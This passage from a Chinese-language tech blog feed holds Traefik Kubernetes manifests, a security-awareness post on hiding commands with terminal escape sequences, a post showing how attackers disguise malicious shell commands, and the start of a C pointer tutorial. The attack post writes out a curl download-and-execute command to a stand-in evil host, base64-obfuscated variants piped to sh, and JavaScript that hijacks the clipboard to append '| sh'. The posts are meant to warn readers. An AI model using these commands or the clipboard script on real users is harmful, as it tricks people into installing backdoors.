class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apiextensions.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">CustomResourceDefinition</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">middlewares.traefik.containo.us</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  group:</span> <span class="string">traefik.containo.us</span></span><br><span class="line"><span class="attr">  version:</span> <span class="string">v1alpha1</span></span><br><span class="line"><span class="attr">  names:</span></span><br><span class="line"><span class="attr">    kind:</span> <span class="string">Middleware</span></span><br><span class="line"><span class="attr">    plural:</span> <span class="string">middlewares</span></span><br><span class="line"><span class="attr">    singular:</span> <span class="string">middleware</span></span><br><span class="line"><span class="attr">  scope:</span> <span class="string">Namespaced</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">traefik-ingress-controller</span></span><br><span class="line"></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="attr">  - apiGroups:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">""</span></span><br><span class="line"><span class="attr">    resources:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">services</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">endpoints</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">secrets</span></span><br><span class="line"><span class="attr">    verbs:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">get</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">list</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">watch</span></span><br><span class="line"><span class="attr">  - apiGroups:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">extensions</span></span><br><span class="line"><span class="attr">    resources:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">ingresses</span></span><br><span class="line"><span class="attr">    verbs:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">get</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">list</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">watch</span></span><br><span class="line"><span class="attr">  - apiGroups:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">extensions</span></span><br><span class="line"><span class="attr">    resources:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">ingresses/status</span></span><br><span class="line"><span class="attr">    verbs:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">update</span></span><br><span class="line"><span class="attr">  - apiGroups:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">traefik.containo.us</span></span><br><span class="line"><span class="attr">    resources:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">middlewares</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">ingressroutes</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">traefikservices</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">ingressroutetcps</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">ingressrouteudps</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">tlsoptions</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">tlsstores</span></span><br><span class="line"><span class="attr">    verbs:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">get</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">list</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">watch</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">traefik-ingress-controller</span></span><br><span class="line"></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line"><span class="attr">  apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">  kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">traefik-ingress-controller</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="attr">  - kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">    name:</span> <span class="string">traefik-ingress-controller</span></span><br><span class="line"><span class="attr">    namespace:</span> <span class="string">default</span></span><br></pre></td></tr></tbody></table></figure><p>將 Traefik 本身跑起來：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">traefik-ingress-controller</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">traefik</span></span><br><span class="line"><span class="attr">  labels:</span></span><br><span class="line"><span class="attr">    app:</span> <span class="string">traefik</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  replicas:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">  selector:</span></span><br><span class="line"><span class="attr">    matchLabels:</span></span><br><span class="line"><span class="attr">      app:</span> <span class="string">traefik</span></span><br><span class="line"><span class="attr">  template:</span></span><br><span class="line"><span class="attr">    metadata:</span></span><br><span class="line"><span class="attr">      labels:</span></span><br><span class="line"><span class="attr">        app:</span> <span class="string">traefik</span></span><br><span class="line"><span class="attr">    spec:</span></span><br><span class="line"><span class="attr">      serviceAccountName:</span> <span class="string">traefik-ingress-controller</span></span><br><span class="line"><span class="attr">      containers:</span></span><br><span class="line"><span class="attr">        - name:</span> <span class="string">traefik</span></span><br><span class="line"><span class="attr">          image:</span> <span class="attr">traefik:v2.2</span></span><br><span class="line"><span class="attr">          args:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="bullet">--api.insecure</span></span><br><span class="line"><span class="bullet">            -</span> <span class="bullet">--accesslog</span></span><br><span class="line"><span class="bullet">            -</span> <span class="bullet">--entrypoints.web.Address=:8000</span></span><br><span class="line"><span class="bullet">            -</span> <span class="bullet">--providers.kubernetesingress</span></span><br><span class="line"><span class="bullet">            -</span> <span class="bullet">--providers.kubernetescrd</span></span><br><span class="line"><span class="attr">          ports:</span></span><br><span class="line"><span class="attr">            - name:</span> <span class="string">web</span></span><br><span class="line"><span class="attr">              containerPort:</span> <span class="number">8000</span></span><br><span class="line"><span class="attr">            - name:</span> <span class="string">admin</span></span><br><span class="line"><span class="attr">              containerPort:</span> <span class="number">8080</span></span><br></pre></td></tr></tbody></table></figure><p>為 Traefik 設定 Service：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">traefik</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  ports:</span></span><br><span class="line"><span class="attr">    - protocol:</span> <span class="string">TCP</span></span><br><span class="line"><span class="attr">      name:</span> <span class="string">web</span></span><br><span class="line"><span class="attr">      port:</span> <span class="number">8000</span></span><br><span class="line"><span class="attr">    - protocol:</span> <span class="string">TCP</span></span><br><span class="line"><span class="attr">      name:</span> <span class="string">admin</span></span><br><span class="line"><span class="attr">      port:</span> <span class="number">8080</span></span><br><span class="line"><span class="attr">  selector:</span></span><br><span class="line"><span class="attr">    app:</span> <span class="string">traefik</span></span><br></pre></td></tr></tbody></table></figure><p>建立 Ingress 與 Middleware(stripprefix)：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">yy-ingress</span></span><br><span class="line"><span class="attr">  annotations:</span></span><br><span class="line">    <span class="string">traefik.ingress.kubernetes.io/router.entrypoints:</span> <span class="string">web</span></span><br><span class="line">    <span class="string">traefik.ingress.kubernetes.io/router.middlewares:</span> <span class="string">default-stripprefix@kubernetescrd</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  rules:</span></span><br><span class="line"><span class="attr">  - host:</span> <span class="string">yy.k8s</span></span><br><span class="line"><span class="attr">    http:</span></span><br><span class="line"><span class="attr">      paths:</span></span><br><span class="line"><span class="attr">      - path:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">        backend:</span></span><br><span class="line"><span class="attr">          serviceName:</span> <span class="string">whales</span></span><br><span class="line"><span class="attr">          servicePort:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">      - path:</span> <span class="string">/app</span></span><br><span class="line"><span class="attr">        backend:</span></span><br><span class="line"><span class="attr">          serviceName:</span> <span class="string">whales</span></span><br><span class="line"><span class="attr">          servicePort:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">      - path:</span> <span class="string">/whoami</span></span><br><span class="line"><span class="attr">        backend:</span></span><br><span class="line"><span class="attr">          serviceName:</span> <span class="string">whoami</span></span><br><span class="line"><span class="attr">          servicePort:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">  - host:</span> <span class="string">admin.yy.k8s</span></span><br><span class="line"><span class="attr">    http:</span></span><br><span class="line"><span class="attr">      paths:</span></span><br><span class="line"><span class="attr">        - path:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">          backend:</span></span><br><span class="line"><span class="attr">            serviceName:</span> <span class="string">traefik</span></span><br><span class="line"><span class="attr">            servicePort:</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">traefik.containo.us/v1alpha1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Middleware</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">stripprefix</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  stripPrefix:</span></span><br><span class="line"><span class="attr">    prefixes:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">/app</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">/whoami</span></span><br></pre></td></tr></tbody></table></figure><p>要注意的重點有：</p><ul><li>CRD 中的權限要記得 middwares 有被加進去。</li><li>要使用 Ingress，Traefik 跑起來時要加上 <code>--providers.kubernetesingress</code></li><li>如果用 IngressRoute 跑，要加上 <code>--providers.kubernetescrd</code></li><li>annotations 中 middleware 的名字最前面需要加上 namespace（本文使用 default）</li><li>如果直接貼 Traefik 官網的 user-guides/crd-acme，要注意它並沒有加上 <code>--providers.kubernetesingress</code>，所以無法與 Ingress 正確綁定</li><li>在 local 測試可以用 <code>kubectl port-forward svc/traefik foo-port:8080</code> 連到 dashboard 來 debug</li></ul><p>更多詳細設定可以參考 <a href="https://docs.traefik.io/user-guides/crd-acme/#ingressroute-definition" target="_blank" rel="noopener">user-guides/crd-acme</a>，以上的設定比較精簡，此文章只有留必要部分而已。</p><p>完整的設定可以到 <a href="https://github.com/yiyu0x/k8s-traefik-example" target="_blank" rel="noopener">GitHub Repo</a> 上面看。</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="kubernetes" scheme="https://blog.yiyu0x.org/tags/kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>眼見為憑？利用終端機特性藏匿惡意指令</title>
    <link href="https://blog.yiyu0x.org/2020/04/29/"/>
    <id>https://blog.yiyu0x.org/2020/04/29/</id>
    <published>2020-04-29T06:19:30.000Z</published>
    <updated>2025-04-12T20:59:43.596Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>對於 Linux 使用者或是軟體工程師來說，終端機是每天必須用到的軟體之一。尤其是那些注重開發效率以及有在維護伺服器的工程師來說，我們都不希望雙手離開鍵盤，分散注意力。這種情況下，當我們要稍微檢視檔案內容時，會使用到以下幾個常用的工具：</p><ul><li>cat</li><li>less</li><li>more</li><li>vim</li></ul><p>然而我們透過工具所看到的檔案內容，可以完全相信嗎？</p><h2 id="眼見為憑？"><a href="#眼見為憑？" class="headerlink" title="眼見為憑？"></a>眼見為憑？</h2><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><script type="text/javascript" src="https://asciinema.org/a/325079.js" id="asciicast-325079" async></script><p>看過上述例子之後，你還敢只用 <code>cat</code> 確認檔案內容嗎？</p><p>為何會發生這種事？原因在於終端機本身就會辨認幾個具有意義的特殊字元，你可能用過一些特別的工具可以讓終端機印出有顏色的字，就是利用到這種特性。</p><p>那這些特殊字元可以操作終端機的哪些行為呢？</p><ul><li>移動游標到任意位置</li><li>刪除任意印出的字元</li><li>操作終端機視窗</li><li>將不同按鍵對應到的終端機行為進行覆寫</li></ul><p>上述範例，就是透過移動終端機游標，讓兩行指令都印在同一個位置上（位置重疊，只會顯示覆蓋的指令），如此一來就可以隱藏被覆蓋的指令。</p><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>我們換 <code>curl -s</code> 試試</p><script type="text/javascript" src="https://asciinema.org/a/325095.js" id="asciicast-325095" async></script><p>看完這個例子之後，我相信你再也不敢相信肉眼看到的內容。</p><h3 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h3><p>如果要確認檔案的內容想要用 <code>cat</code> 的話，可以加上參數 <code>v</code>，顯示不可視字元。</p><p>以第一個例子來說：<code>cat -v script.sh</code></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"evil!"</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">^[[2Aecho <span class="string">"Hello World!"</span></span><br></pre></td></tr></tbody></table></figure><p><code>^[[2A</code> 就是告訴終端機將游標往上移動兩行，繼續從該位置印出（覆蓋原本的 echo “evil!”）。</p><p>可以的話，還是建議使用文字編輯器打開確認內容會比起直接印出內容在終端機來得可信。</p><p>如果想要自己測試的話可以使用以下指令</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">'#!/bin/sh\n\necho "evil!"\nexit 0\n\033[2Aecho "Hello World!"\n'</span> > script.sh</span><br><span class="line">chmod a+x script.sh</span><br></pre></td></tr></tbody></table></figure><p>或是你想深入了解終端機控制字元以及不同終端機的狀況可以參考 <a href="https://www.infosecmatter.com/terminal-escape-injection/#what-are-the-escape-sequences" target="_blank" rel="noopener">Terminal Escape Injection</a>。</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="資訊安全" scheme="https://blog.yiyu0x.org/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>從駭客角度告訴你為何不要隨意複製指令</title>
    <link href="https://blog.yiyu0x.org/2020/03/16/"/>
    <id>https://blog.yiyu0x.org/2020/03/16/</id>
    <published>2020-03-16T03:13:36.000Z</published>
    <updated>2025-04-12T20:59:43.594Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>相信很多人都有這樣的經驗，下指令時產生某某錯誤。這個錯誤可能沒見過，也可能是之前遇過但是忘記怎麼解。但我們只要將錯誤複製起來，貼上搜尋引擎，馬上就會跳出各種網頁可以參考，無倫是知名的程式討論論壇，或著是官方文件，又或著是個人自行架設的部落格。看到指令就貼上這個習慣，是開發者的眾多壞習慣之一。</p><p>駭客可以很巧妙的利用這一點，將精心製作的後門程式（或其他惡意程式），透過包裝，誘騙受害者（可能就是你）去執行。</p><h2 id="生產惡意指令"><a href="#生產惡意指令" class="headerlink" title="生產惡意指令"></a>生產惡意指令</h2><p>假如今天我想要讓受害者的電腦執行一條指令就被植入後門，我會這麼做：</p><p><code>curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil</code></p><p>首先先透過 <code>curl</code> 下載遠端編譯好的惡意程式，並且給予該程式執行權限，然後執行，最後刪除（匿蹤）。</p><p>但這種指令我想應該沒有人會直接貼上執行，不但意圖明顯，而且還直接告訴受害者：「我打算下載來路不名的檔案，而且要執行它」。</p><h2 id="偽裝"><a href="#偽裝" class="headerlink" title="偽裝"></a>偽裝</h2><p>想要偽裝通常我們會將指令包裹成其他意圖，透過簡單的編碼來將這個惡意指令進行編碼，以下選用 base64 進行編碼：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==</span><br></pre></td></tr></tbody></table></figure><p>為何選擇使用 <code>base64</code>，原因是因為 Linux 內建就有 base64 工具，受害人可以透過執行 base64 解碼工具，解出具有意義的字串</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d</span><br></pre></td></tr></tbody></table></figure><p>output:</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil</span><br></pre></td></tr></tbody></table></figure><p>接著將字串 pipe 到 <code>sh</code> 就可以直接運行：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d | sh</span><br></pre></td></tr></tbody></table></figure><p>以上指令就沒有辦法一眼就看出目的，但意圖不變。</p><h2 id="進一步偽裝"><a href="#進一步偽裝" class="headerlink" title="進一步偽裝"></a>進一步偽裝</h2><p>有經驗的開發者看到指令中帶有 <code>sh</code> 就會馬上起疑心，這是一件好事。因為本來就不應該隨便下具有執行權限的指令，何況你根本不知道那串 <code>base64</code> 字串解出來為何。</p><p>我們可以先將我們的惡意指令多新增一個功能，印出一些字串，讓受害者以為這串 <code>base64</code> 就是一個普通的字串而已：</p><p><code>echo "Hi, Im yiyu0x :)" && curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil</code></p><p>進行編碼：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==</span><br></pre></td></tr></tbody></table></figure><p>惡意指令：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d | sh</span><br></pre></td></tr></tbody></table></figure><p>執行後的結果：</p><p><code>Hi, Im yiyu0x :)</code></p><p>如果我將個指令放在一些顯眼的地方像是網站的自我介紹、說明欄，我相信有些具有好奇心的讀者可能就會傻傻執行。但是一些具有經驗的讀者還是會發現句尾帶的那個 <code>sh</code>，而不去執行它。</p><p>那我如果改成這樣呢？</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d</span><br></pre></td></tr></tbody></table></figure><p>這樣子我相信 9 成以上的人（包含我自己），都會想把這段指令貼上去執行看一下結果為何，畢竟就是一條單純的解碼指令，怎麼可能有害？</p><p>但是別忘了，惡意攻擊者可以在網頁中的 JS 插入：</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> source = <span class="built_in">document</span>.querySelector(<span class="string">'div.source'</span>) <span class="comment">//指令區塊</span></span><br><span class="line">source.addEventListener(<span class="string">'copy'</span>, (event) => {</span><br><span class="line">    <span class="keyword">const</span> selection = <span class="built_in">document</span>.getSelection()</span><br><span class="line">    event.clipboardData.setData(<span class="string">'text/plain'</span>, selection.toString() + <span class="string">'| sh'</span>)</span><br><span class="line">    event.preventDefault()</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p>該程式碼的意思為當你複製字串時，自動將剪貼板中的字串末端加上 <code>| sh</code>，意思就是你複製到的字串其實是：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d | sh</span><br></pre></td></tr></tbody></table></figure><p>如果你貼上 terminal 之後沒有檢查就直接按下 enter，那麼你的電腦就不知不覺的執行了一個執行檔而你完全沒有感覺。</p><p>想想看，如果在開發者的部落格自我介紹，放入這種指令式的自我介紹是不是很有趣？或是放在臉書的自我介紹？當你很開心的貼上指令時，很可能默默中了人家的後門程式。</p><h2 id="最後"><a href="#最後" class="headerlink" title="最後"></a>最後</h2><p>該文章的重點無非還是提醒幾點資安的意識：</p><ul><li>來路不明的指令不要貼上終端機執行</li><li>不要相信剪貼板的內容，按下 Enter 執行前應該肉眼再度檢查一次指令</li></ul><p>最後提醒大家，在未經同意下入侵他人電腦是有刑責的，不要以身試法！</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="資訊安全" scheme="https://blog.yiyu0x.org/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>重新看懂指標與陣列之間的交互關係</title>
    <link href="https://blog.yiyu0x.org/2020/02/15/"/>
    <id>https://blog.yiyu0x.org/2020/02/15/</id>
    <published>2020-02-15T12:39:00.000Z</published>
    <updated>2025-04-12T20:59:43.596Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>C 語言中，指標與陣列之間的關係一直是一個初學者很難理解的坑。又或是很多人只知道寫法，但卻從來沒有理解過背後的原因。相信各位理解了原因之後，在撰寫 C 語言時會對自己操作這個語言更加有自信。這篇文章重新試著釐清這指標與陣列之間的關係，希望對大家能有幫助。</p><h2 id="陣列宣告與指標宣告"><a href="#陣列宣告與指標宣告" class="headerlink" title="陣列宣告與指標宣告"></a>陣列宣告與指標宣告</h2><p>陣列可以用以下的方式宣告：</p><ol><li>宣告但是尚未初始化<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr_init0[<span class="number">3</span>]; <span class="comment">// 宣告但是尚未初始化，此時陣列中的值是沒有意義的。</span></span><br></pre></td></tr></tbody></table></figure></li><li>宣告並且初始化<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr_init1[<span class="number">3</span>] = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>};</span><br></pre></td></tr></tbody></table></figure></li><li>不指定大小，大小會依照後面元素個數來決定<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr_init2[] = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>};</span><br></pre></td></tr></tbody></table></figure></li><li>C99 新增。指定特定元素，其他未被指定元素會被設定為 0<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 